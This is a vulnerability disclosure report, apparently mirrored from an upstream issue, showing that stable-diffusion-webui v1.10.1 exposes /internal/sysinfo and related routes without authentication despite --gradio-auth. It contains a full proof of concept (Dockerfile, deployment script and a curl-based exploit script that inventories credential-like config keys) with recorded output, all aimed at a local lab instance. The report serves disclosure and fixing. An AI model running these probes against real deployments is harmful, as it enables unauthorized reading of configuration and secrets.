# stable-diffusion-webui: custom internal routes expose configuration despite --gradio-auth

**Upstream issue:** [AUTOMATIC1111/stable-diffusion-webui#17492](https://github.com/AUTOMATIC1111/stable-diffusion-webui/issues/17492)

**Upstream status:** OPEN (checked 2026-09-23; opened 2026-09-21; last activity 2026-09-22). Open status is not maintainer confirmation.

**Verification: DYNAMICALLY-REPRODUCED (upstream-reported).** The PoC and recorded output below are taken from the linked issue. This report synchronization did not rerun the reproduction or test current upstream code.

Finding: F-006

**Affected snapshot:** v1.10.1, commit [`82a973c04367123ae98bd9abdf80d9eda9b910e2`](https://github.com/AUTOMATIC1111/stable-diffusion-webui/commit/82a973c04367123ae98bd9abdf80d9eda9b910e2). The commit is recorded in the issue console output.

## Reproduction conditions

- WSL2 Ubuntu 24.04, Docker, Python 3.10.21, torch 2.4.1+cpu; no model or GPU needed for the HTTP checks.
- A network-reachable service started with `--gradio-auth victim:pass123 --listen`. These are synthetic laboratory credentials.
- The recorded Docker mapping exposed port 18601 on all interfaces. For a local reproduction, replace `-p 18601:7860` in the preserved deployment script with `-p 127.0.0.1:18601:7860`.

## Description

After `demo.launch()`, webui.py:103-114 registers `/internal/*` and `/sd_extra_networks/*` routes directly on the FastAPI app without an authentication dependency. Gradio's per-route login check does not cover those application routes.

## Impact

When the service is network-accessible, an unauthenticated caller can read configuration and environment information despite `--gradio-auth`. Extension secrets or active previews may also be exposed if present; neither real third-party secrets nor a live generated preview were present in this test.

## PoC

Use WSL2 Ubuntu 24.04 and Docker. Check out commit `82a973c04367123ae98bd9abdf80d9eda9b910e2`; save the fullstack files below, then set SNAP and HERE in deploy_fullstack.sh to the checkout and script directory. Run the deployment and exploit commands shown. The recorded mapping was 0.0.0.0:18601; for an isolated reproduction change it to `127.0.0.1:18601:7860`. No model is needed for these HTTP checks. The pinned dependencies are installed by the Dockerfile; STABLE_DIFFUSION_REPO uses w-e-w/stablediffusion at the original pinned commit because the old dependency URL was unavailable.

The complete PoC and required text fixtures follow. Original code comments and diagnostic strings are preserved to keep the reproduced scripts unchanged. Absolute laboratory paths must be adapted to the equivalent disposable layout. No reproduction was rerun while preparing this report.

### `commands.sh`

```bash
# 部署（构建+起容器+等就绪）
MSYS_NO_PATHCONV=1 wsl.exe -d Ubuntu-24.04 -- bash -lc 'cd /mnt/f/Disassertation/PySAST/PySAST-repro/unresolved-repro/01-sdwebui-gradio-auth/fullstack && bash deploy_fullstack.sh 2>&1 | tee build_runtime.log'
# 利用（宿主侧无凭证攻击进程，走映射端口 18601，证据落盘 evidence/）
MSYS_NO_PATHCONV=1 wsl.exe -d Ubuntu-24.04 -- bash /mnt/f/Disassertation/PySAST/PySAST-repro/unresolved-repro/01-sdwebui-gradio-auth/fullstack/exploit_f006.sh
```

### `fullstack/Dockerfile`

```dockerfile
FROM python:3.10-slim

ENV DEBIAN_FRONTEND=noninteractive \
    PIP_DISABLE_PIP_VERSION_CHECK=1 \
    PIP_NO_CACHE_DIR=1

RUN apt-get update && apt-get install -y --no-install-recommends \
        git libgl1 libglib2.0-0 curl ca-certificates \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# CPU 版 torch（固定 2.4.1/0.19.1：v1.10.1 同期版本；不固定会拉到 torch>=2.6，
# 其 torch.load 默认 weights_only=True 破坏本版本加载路径；--index-url 排他，
# 故先从 PyPI 装齐 torch 纯 Python 依赖，再单装两个 +cpu wheel）
RUN pip install filelock typing-extensions networkx jinja2 fsspec sympy mpmath \
 && pip install torch==2.4.1 torchvision==0.19.1 --index-url https://download.pytorch.org/whl/cpu

# openai/CLIP：launch.py prepare_environment 会检查 is_installed("clip")（requirements_versions.txt 不含它）
RUN pip install "git+https://github.com/openai/CLIP.git"

COPY requirements_versions.txt /tmp/requirements_versions.txt
RUN pip install -r /tmp/requirements_versions.txt

COPY . /app

# 上游依赖仓库 Stability-AI/stablediffusion 已从 GitHub 删除（404）；launch_utils.py:349 官方支持
# STABLE_DIFFUSION_REPO 换源；w-e-w/stablediffusion 的 main 顶端恰为 pinned commit cf1d67a6fd...（fork 后未动），
# checkout 工作树与原上游逐字节一致。其余 4 仓库（assets/k-diffusion/BLIP/generative-models）仍用原上游 URL。
ENV STABLE_DIFFUSION_REPO=https://github.com/w-e-w/stablediffusion.git

# 构建期跑一次 prepare_environment（--exit 结尾退出）：按 launch_utils.py 内置 commit
# 克隆 5 个依赖仓库到 /app/repositories（与真实部署完全同路径同逻辑）
RUN python launch.py --skip-install --skip-torch-cuda-test --skip-version-check --exit

EXPOSE 7860

ENTRYPOINT ["python", "launch.py"]
CMD ["--skip-install", "--skip-prepare-environment", "--skip-torch-cuda-test", \
     "--skip-version-check", "--use-cpu", "all", "--no-download-sd-model", \
     "--gradio-auth", "victim:pass123", "--listen", "--port", "7860", \
     "--data-dir", "/tmp/webuidata"]
```

### `fullstack/deploy_fullstack.sh`

```bash
#!/usr/bin/env bash
# 授权声明：授权的本地安全漏洞动态复现（F-006）；只操作本机 Docker 与回环映射端口。
set -uo pipefail

IMG=sdwebui-f006-fullstack:v1.10.1
NAME=sdwebui-f006-fullstack
SNAP=/mnt/f/Disassertation/PySAST/PySASTBench/realworld_projects/new-audit-0005-stable-diffusion-webui
HERE=/mnt/f/Disassertation/PySAST/PySAST-repro/unresolved-repro/01-sdwebui-gradio-auth/fullstack
BASE=http://127.0.0.1:18601

echo "=== [1/4] 快照版本核验（容器内外应一致） ==="
git -C "$SNAP" log --oneline -1 || true

echo "=== [2/4] 构建镜像 $IMG ==="
docker rm -f "$NAME" 2>/dev/null || true
docker build --progress=plain -f "$HERE/Dockerfile" -t "$IMG" "$SNAP" || { echo "BUILD FAILED"; exit 1; }

echo "=== [3/4] 启动容器 $NAME（只新增本容器，不动其它容器） ==="
docker run -d --name "$NAME" -p 18601:7860 "$IMG" || { echo "RUN FAILED"; exit 1; }
docker ps --filter "name=$NAME" --format 'table {{.Names}}\t{{.Status}}\t{{.Ports}}'

echo "=== [4/4] 等待 webui 就绪（以无凭证 GET /internal/sysinfo 可达为准） ==="
up=0
for i in $(seq 1 120); do
  code="$(curl -s -m 5 -o /dev/null -w '%{http_code}' "$BASE/internal/sysinfo" || true)"
  if [ "$code" != "000" ] && [ -n "$code" ]; then
    echo "READY after ${i}s: /internal/sysinfo answered HTTP $code"
    up=1; break
  fi
  sleep 1
done
if [ "$up" -ne 1 ]; then
  echo "SERVICE NOT READY in 120s"; docker logs --tail 60 "$NAME" 2>&1; exit 2
fi
echo "DEPLOY OK"
```

### `fullstack/exploit_f006.sh`

```bash
#!/usr/bin/env bash
# 授权声明：授权的本地安全漏洞动态复现（F-006）；只回环访问本机映射端口，不使用任何登录态。
# 注：/internal/progress 在 modules/progress.py:78 为 POST-only，GET 得 405 亦属"未拦"证据；
#     /sd_extra_networks/thumb 对不存在文件由处理函数返回 404（ui_extra_networks.py:100-101），
#     断言其绝无 401/403 —— 即未认证直达处理函数。
set -uo pipefail

BASE="${BASE:-http://127.0.0.1:18601}"
EV="/mnt/f/Disassertation/PySAST/PySAST-repro/unresolved-repro/01-sdwebui-gradio-auth/evidence"
mkdir -p "$EV"
FAILED=0

req_save() { # req_save <outfile-stem> <curl 参数...> -- <url>   保存请求行+响应头+响应体
  local stem="$1"; shift
  local url="${@: -1}"
  local args=("${@:1:$#-1}")
  { echo "# REQUEST: curl ${args[*]} $url"
    echo "# DATE: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
    echo "# ----------------------------------------------------------------"
    curl -sS -m 15 -D - "${args[@]}" "$url" 2>&1
    echo; echo "# END"
  } > "$EV/$stem.txt"
}
expect() { if [ "$1" = "$2" ]; then echo "PASS [$3] HTTP $1 (expect $2)"; else echo "FAIL [$3] HTTP $1 (expect $2)"; FAILED=$((FAILED + 1)); fi; }
expect_not() { if [ "$1" != "$2" ]; then echo "PASS [$3] HTTP $1 (not $2)"; else echo "FAIL [$3] HTTP $1 (unexpectedly $2)"; FAILED=$((FAILED + 1)); fi; }
codeof() { curl -s -m 15 -o /dev/null -w '%{http_code}' "${@:2}" "$1" 2>/dev/null || echo 000; }

echo "[*] target: $BASE (host-side attacker process, no credentials)"

echo "== 1. baseline: --gradio-auth wall on gradio's own routes =="
c=$(codeof "$BASE/config");                          expect "$c" 401 "GET /config no creds (gradio route, login_check)"
req_save "01-baseline-config-401" "$BASE/config"

JAR="$(mktemp)"
curl -sS -m 10 -c "$JAR" -o /dev/null -X POST -d "username=victim" -d "password=pass123" "$BASE/login"
c=$(codeof "$BASE/config" -b "$JAR");                expect "$c" 200 "GET /config with POST /login session cookie (creds valid, wall real)"
req_save "02-baseline-config-200-with-login-cookie" -b "$JAR" "$BASE/config"
rm -f "$JAR"

echo "== 2. attack: unauthenticated reads of app-level internal routes =="
c=$(codeof "$BASE/internal/sysinfo");                expect "$c" 200 "GET /internal/sysinfo no creds (full config store + package list)"
req_save "03-attack-internal-sysinfo-200" "$BASE/internal/sysinfo"

c=$(codeof "$BASE/internal/progress" -X POST -H "Content-Type: application/json" -d '{"id_task":"f006-probe"}')
                                                     expect "$c" 200 "POST /internal/progress no creds (live preview API)"
req_save "04-attack-internal-progress-post-200" -X POST -H "Content-Type: application/json" -d '{"id_task":"f006-probe"}' "$BASE/internal/progress"

c=$(codeof "$BASE/internal/progress");               expect_not "$c" 401 "GET /internal/progress no creds (405=POST-only, still no auth gate)"
req_save "05-attack-internal-progress-get-405" "$BASE/internal/progress"

c=$(codeof "$BASE/internal/pending-tasks");          expect "$c" 200 "GET /internal/pending-tasks no creds"
req_save "06-attack-internal-pending-tasks-200" "$BASE/internal/pending-tasks"

c=$(codeof "$BASE/sd_extra_networks/thumb?filename=x")
                                                     expect_not "$c" 401 "GET /sd_extra_networks/thumb no creds (handler reached; 404 File not found)"
req_save "07-attack-sd-extra-networks-thumb" "$BASE/sd_extra_networks/thumb?filename=x"

echo "== 3. evidence: save sysinfo response and inventory sensitive fields =="
awk '/^\{/{flag=1} flag' "$EV/03-attack-internal-sysinfo-200.txt" | sed '/^# END$/,$d' > "$EV/sysinfo_response.json"
if [ -s "$EV/sysinfo_response.json" ] && python3 -c "import json,sys; json.load(open('$EV/sysinfo_response.json', encoding='utf-8'))" 2>/dev/null; then
  echo "PASS [sysinfo body is valid JSON, saved to evidence/sysinfo_response.json]"
else
  echo "FAIL [sysinfo response is not valid JSON]"; FAILED=$((FAILED+1))
fi

echo "== sysinfo content summary (sensitive fields) =="
python3 - "$EV/sysinfo_response.json" <<'PYEOF'
import json, sys
d = json.load(open(sys.argv[1], encoding='utf-8'))
cfg = d.get("Config")
print("top-level keys:", sorted(d.keys()))
if isinstance(cfg, dict):
    print("Config(shared.opts.data) entries:", len(cfg))
    for k in sorted(cfg):
        v = str(cfg[k])
        if "key" in k.lower() or "token" in k.lower() or "secret" in k.lower() or "api" in k.lower():
            print(f"  Config['{k}'] = {v[:60]!r}  <- credential-class key")
pkgs = d.get("Packages") or d.get("packages")
if isinstance(pkgs, list):
    print("Packages entries:", len(pkgs))
ext = d.get("Extensions")
if isinstance(ext, list):
    print("Extensions entries:", len(ext))
for k in ("Platform", "Python", "Version", "Commit", "Commandline", "Data path", "Torch env info"):
    if k in d:
        print(f"{k}: {str(d[k])[:110]}")
PYEOF

echo
if [ "$FAILED" -eq 0 ]; then
  echo "RESULT: PASS -- gradio-auth wall does not cover webui's own app-level routes /internal/* /sd_extra_networks/* (F-006 confirmed on real deployment)"
  exit 0
else
  echo "RESULT: FAILED -- $FAILED assertions did not pass (see FAIL lines above)"
  exit 1
fi
```

### Expected behavior

When --gradio-auth is enabled, unauthenticated requests to sensitive application routes should be rejected. The authenticated session should retain normal access.

## Execution result

An unchanged v1.10.1 deployment with `--gradio-auth victim:pass123 --listen` rejected unauthenticated `/config` (401) but returned `/internal/sysinfo` (200, 21,271 bytes; 16 Config keys and 123 package entries). Authenticated login restored the expected control response; 7/7 assertions passed. The no-model CPU deployment could not generate images. Optional `/sdapi` authentication is a separate configuration and is not the basis of this finding.

Recorded output below is preserved verbatim, including original annotations and synthetic fixture credentials. Interpret it with the limits above.

### `observed-output-1`

```text
Launching Web UI with arguments: --skip-install --skip-prepare-environment --skip-torch-cuda-test --skip-version-check --use-cpu all --no-download-sd-model --gradio-auth victim:pass123 --listen --port 7860 --data-dir /tmp/webuidata
loading stable diffusion model: FileNotFoundError
Stable diffusion model failed to load          <- 无模型懒加载失败被捕获，不阻塞启动
Applying attention optimization: InvokeAI... done.
Running on local URL:  http://0.0.0.0:7860
Startup time: 4.7s (import torch: 2.4s, import gradio: 0.5s, setup paths: 0.4s, initialize shared: 0.2s, other imports: 0.3s, load scripts: 0.4s, create ui: 0.2s, gradio launch: 0.2s).
```

### `observed-output-2`

```text
[*] target: http://127.0.0.1:18601 (host-side attacker process, no credentials)
== 1. baseline: --gradio-auth wall on gradio's own routes ==
PASS [GET /config no creds (gradio route, login_check)] HTTP 401 (expect 401)
PASS [GET /config with POST /login session cookie (creds valid, wall real)] HTTP 200 (expect 200)
== 2. attack: unauthenticated reads of app-level internal routes ==
PASS [GET /internal/sysinfo no creds (full config store + package list)] HTTP 200 (expect 200)
PASS [POST /internal/progress no creds (live preview API)] HTTP 200 (expect 200)
PASS [GET /internal/progress no creds (405=POST-only, still no auth gate)] HTTP 405 (not 401)
PASS [GET /internal/pending-tasks no creds] HTTP 200 (expect 200)
PASS [GET /sd_extra_networks/thumb no creds (handler reached; 404 File not found)] HTTP 404 (not 401)
== 3. evidence: save sysinfo response and inventory sensitive fields ==
PASS [sysinfo body is valid JSON, saved to evidence/sysinfo_response.json]
== sysinfo content summary (sensitive fields) ==
top-level keys: ['CPU', 'Checksum', 'Commandline', 'Commit', 'Config', 'Data path', 'Environment', 'Exceptions', 'Extensions', 'Extensions dir', 'Git status', 'Inactive extensions', 'Packages', 'Platform', 'Python', 'RAM', 'Script path', 'Startup', 'Torch env info', 'Version']
Config(shared.opts.data) entries: 16
Packages entries: 123
Extensions entries: 0
Platform: Linux-6.6.87.2-microsoft-standard-WSL2-x86_64-with-glibc2.41
Python: 3.10.21
Version: v1.10.1
Commit: 82a973c04367123ae98bd9abdf80d9eda9b910e2
Commandline: ['launch.py', '--skip-install', '--skip-prepare-environment', '--skip-torch-cuda-test', '--skip-version-check'
Data path: /tmp/webuidata
Torch env info: {'torch_version': '2.4.1+cpu', 'is_debug_build': 'False', 'cuda_compiled_version': None, 'gcc_version': None, 

RESULT: PASS -- gradio-auth wall does not cover webui's own app-level routes /internal/* /sd_extra_networks/* (F-006 confirmed on real deployment)
```

The HTTP 200 responses and returned configuration establish the observed exposure. The 404/405 probes are supplemental observations; those status codes alone do not prove data disclosure. Image generation and live-preview disclosure were not demonstrated.

<details>
<summary>Full console log published with the issue</summary>

```Shell
Launching Web UI with arguments: --skip-install --skip-prepare-environment --skip-torch-cuda-test --skip-version-check --use-cpu all --no-download-sd-model --gradio-auth victim:pass123 --listen --port 7860 --data-dir /tmp/webuidata
/usr/local/lib/python3.10/site-packages/timm/models/layers/__init__.py:49: FutureWarning: Importing from timm.models.layers is deprecated, please import via timm.layers
  warnings.warn(f"Importing from {__name__} is deprecated, please import via timm.layers", FutureWarning)
no module 'xformers'. Processing without...
no module 'xformers'. Processing without...
No module 'xformers'. Proceeding without it.
Warning: caught exception 'Torch not compiled with CUDA enabled', memory monitor disabled
loading stable diffusion model: FileNotFoundError
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/threading.py", line 973, in _bootstrap
    self._bootstrap_inner()
  File "/usr/local/lib/python3.10/threading.py", line 1016, in _bootstrap_inner
    self.run()
  File "/usr/local/lib/python3.10/threading.py", line 953, in run
    self._target(*self._args, **self._kwargs)
  File "/app/modules/initialize.py", line 149, in load_model
    shared.sd_model  # noqa: B018
  File "/app/modules/shared_items.py", line 175, in sd_model
    return modules.sd_models.model_data.get_sd_model()
  File "/app/modules/sd_models.py", line 693, in get_sd_model
    load_model()
  File "/app/modules/sd_models.py", line 788, in load_model
    checkpoint_info = checkpoint_info or select_checkpoint()
  File "/app/modules/sd_models.py", line 234, in select_checkpoint
    raise FileNotFoundError(error_message)
FileNotFoundError: No checkpoints found. When searching for checkpoints, looked at:
 - file /app/model.ckpt
 - directory /tmp/webuidata/models/Stable-diffusionCan't run without a checkpoint. Find and place a .ckpt or .safetensors file into any of those locations.


Stable diffusion model failed to load
Applying attention optimization: InvokeAI... done.
Running on local URL:  http://0.0.0.0:7860

To create a public link, set `share=True` in `launch()`.
Startup time: 4.7s (import torch: 2.4s, import gradio: 0.5s, setup paths: 0.4s, initialize shared: 0.2s, other imports: 0.3s, load scripts: 0.4s, create ui: 0.2s, gradio launch: 0.2s).

--- HTTP PoC output (WSL launcher encoding banner omitted) ---
[*] target: http://127.0.0.1:18601 (host-side attacker process, no credentials)
== 1. baseline: --gradio-auth wall on gradio's own routes ==
PASS [GET /config no creds (gradio route, login_check)] HTTP 401 (expect 401)
PASS [GET /config with POST /login session cookie (creds valid, wall real)] HTTP 200 (expect 200)
== 2. attack: unauthenticated reads of app-level internal routes ==
PASS [GET /internal/sysinfo no creds (full config store + package list)] HTTP 200 (expect 200)
PASS [POST /internal/progress no creds (live preview API)] HTTP 200 (expect 200)
PASS [GET /internal/progress no creds (405=POST-only, still no auth gate)] HTTP 405 (not 401)
PASS [GET /internal/pending-tasks no creds] HTTP 200 (expect 200)
PASS [GET /sd_extra_networks/thumb no creds (handler reached; 404 File not found)] HTTP 404 (not 401)
== 3. evidence: save sysinfo response and inventory sensitive fields ==
PASS [sysinfo body is valid JSON, saved to evidence/sysinfo_response.json]
== sysinfo content summary (sensitive fields) ==
top-level keys: ['CPU', 'Checksum', 'Commandline', 'Commit', 'Config', 'Data path', 'Environment', 'Exceptions', 'Extensions', 'Extensions dir', 'Git status', 'Inactive extensions', 'Packages', 'Platform', 'Python', 'RAM', 'Script path', 'Startup', 'Torch env info', 'Version']
Config(shared.opts.data) entries: 16
Packages entries: 123
Extensions entries: 0
Platform: Linux-6.6.87.2-microsoft-standard-WSL2-x86_64-with-glibc2.41
Python: 3.10.21
Version: v1.10.1
Commit: 82a973c04367123ae98bd9abdf80d9eda9b910e2
Commandline: ['launch.py', '--skip-install', '--skip-prepare-environment', '--skip-torch-cuda-test', '--skip-version-check'
Data path: /tmp/webuidata
Torch env info: {'torch_version': '2.4.1+cpu', 'is_debug_build': 'False', 'cuda_compiled_version': None, 'gcc_version': None, 

RESULT: PASS -- gradio-auth wall does not cover webui's own app-level routes /internal/* /sd_extra_networks/* (F-006 confirmed on real deployment)
```

</details>

### Supporting attachment

The issue links [sysinfo.json](https://github.com/user-attachments/files/32469739/sysinfo.json) from the same isolated reproduction. This report retains that source link; the attachment is not bundled or independently revalidated here.

## Suggested fix

Apply a consistent authentication dependency to sensitive custom routes whenever Gradio authentication is enabled. Verify unauthenticated access is denied for sysinfo, progress and extra-network endpoints, and minimize sensitive configuration output.

## Related reports and evidence limits

Related report: https://github.com/AUTOMATIC1111/stable-diffusion-webui/issues/17161 (same authentication gap). This new issue provides an independent complete PoC, a real v1.10.1 deployment, and checks of related built-in routes. The existing discussion links #16755; this report does not claim the issue was previously unknown.

No browser was needed for the HTTP reproduction (curl client). Sysinfo reports a copied worktree with CRLF differences; a read-only git diff --ignore-space-at-eol --exit-code inside the test container returned 0. No claim of a current upstream retest beyond the specified commit is made.

As of 2026-09-23, the issue has one [comment](https://github.com/AUTOMATIC1111/stable-diffusion-webui/issues/17492#issuecomment-5777606645) requesting reproduction steps, expected behavior and environment details. That comment supplies no additional reproduction evidence or confirmed fix.
